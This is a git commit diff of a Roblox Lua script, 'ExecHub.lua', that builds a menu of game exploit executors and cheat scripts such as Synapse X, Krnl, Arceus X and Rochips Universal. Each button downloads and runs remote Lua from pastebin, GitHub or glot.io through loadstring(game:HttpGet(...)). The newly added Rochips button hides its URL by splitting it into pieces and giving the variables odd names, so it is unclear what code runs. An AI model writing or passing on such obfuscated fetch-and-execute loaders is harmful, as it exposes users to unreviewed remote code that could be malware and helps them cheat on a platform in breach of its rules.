cca0edb467b2ca2d7191d7526a3d5d98fc4250fc
HDAdminModule <fatimashoma44@gmail.com>
2024-10-26 10:05:37 -0400

    Update ExecHub.lua

--- ExecHub.lua
+++ ExecHub.lua
@@ -3,69 +3,55 @@ local OrionLib = loadstring(game:HttpGet(('https://pastebin.com/raw/WRUyYTdY')))
 
 local Window = OrionLib:MakeWindow({Name = "Executors", HidePremium = false, SaveConfig = true, ConfigFolder = nil})
 
-local Tab2 = Window:MakeTab({
-	Name = "Keyboard",
-	Icon = "rbxassetid://4483345998,
-	PremiumOnly = false
-})
-local Section2 = Tab2:AddSection({
-	Name = "Keyboard"
-})
-Tab2:AddButton({
-	Name = "[Keyboard] Rochips Universal"
-	Callback = function()
-	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rochips-universal-18049"))()
 
-	end
-})
 
-local Tab1 = Window:MakeTab({
+local Tab = Window:MakeTab({
 	Name = "Executors",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
 
-local Section = Tab1:AddSection({
+local Section = Tab:AddSection({
 	Name = "why do i keep naming this stuff executors"
 })
 
 
-Tab1:AddButton({
+Tab:AddButton({
 	Name = "Synapse X [PE Delta]",
 	Callback = function()
       		loadstring(game:HttpGet("https://raw.githubusercontent.com/delta-hydro/secret-host-haha/main/syn_ui_new.lua"))()
   	end    
 })
 
-Tab1:AddButton({
+Tab:AddButton({
 	Name = "Codex [PE]",
 	Callback = function()
       		loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Codex.lua"))()
   	end    
 })
 
-Tab1:AddButton({
+Tab:AddButton({
 	Name = "Kiwi [PE]",
 	Callback = function()
       		loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Kiwi-Ui.lua"))()
   	end    
 })
 
-Tab1:AddButton({
+Tab:AddButton({
 	Name = "Krypton [PE]",
 	Callback = function()
       		loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Krypton.lua"))()
   	end    
 })
 
-Tab1:AddButton({
+Tab:AddButton({
 	Name = "Krnl [PE]",
 	Callback = function()
       		loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Knrl.lua"))()
   	end    
 })
 
-Tab1:AddButton({
+Tab:AddButton({
 	Name = "Arceus X [PE]",
 	Callback = function()
       		loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Arceus_X_V3.lua"))()
@@ -79,4 +65,24 @@ OrionLib:MakeNotification({
 	Time = 5
 })
 
+local Tab = Window:MakeTab({
+	Name = "Keyboard",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
 
+local Section = Tab:AddSection({
+	Name = "Keyboard"
+})
+
+Tab:AddButton({
+	Name = "[Built-In Keyboard] Rochips Universal",
+	Callback = function()
+		if "you wanna use rochips universal" then
+	local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
+	local im,lonely,z_c=task.wait,game,loadstring
+	z_c(lonely:HttpGet(z_z..""..z_x))()
+	return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
+end
+  	end    
+})
